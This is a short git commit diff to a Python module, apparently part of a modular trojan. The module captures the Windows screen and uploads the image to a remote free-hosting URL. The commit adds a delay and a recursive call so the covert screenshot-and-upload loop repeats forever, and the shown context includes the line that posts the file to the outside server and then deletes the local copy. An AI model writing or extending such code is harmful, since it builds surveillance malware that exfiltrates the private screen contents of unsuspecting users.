4dd30ea6c7e62a5909af5181f1449fbaa620bfee
Psyberlupus <psyberlupus@gmail.com>
2019-11-29 01:15:07 +0530

    Update screenshot.py
    run again

--- modules/screenshot.py
+++ modules/screenshot.py
@@ -4,6 +4,7 @@ import win32con
 import win32api
 import requests
 import os
+import time
 
 def run(**args):
 # grab a handle to the main window
@@ -36,6 +37,7 @@ def run(**args):
    win32gui.DeleteObject(screenshot.GetHandle())
 
 #Send to remote server
+   time.sleep(20)
    url = "http://psyberlupus.000webhostapp.com/site.php/post"
    files = {'image': open('screenshot.bmp','rb')}
    try:
@@ -47,5 +49,6 @@ def run(**args):
    data = f_des.read()
    f_des.close()
    os.remove("screenshot.bmp")
+   run()
    return data
 
